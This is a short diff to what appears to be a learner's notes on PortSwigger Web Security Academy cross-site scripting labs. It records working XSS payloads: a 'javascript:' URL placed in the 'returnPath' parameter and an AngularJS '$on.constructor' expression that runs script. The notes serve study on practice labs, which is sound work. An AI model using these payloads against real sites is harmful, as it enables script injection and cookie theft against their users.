@@ -47,3 +47,9 @@ url: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jqu
 solution: 
    step-1: navigate to submit feedback
    step-2: change url get param 'returnPath' from '/' to 'javascript:alert(document.cookies)'
+
+[lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded]
+url: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression
+note: I had to look at the solution help for this one; I was not aware of '$on.constructor' prior to this lab.
+solution: {{$on.constructor('alert(18)')()}}
+
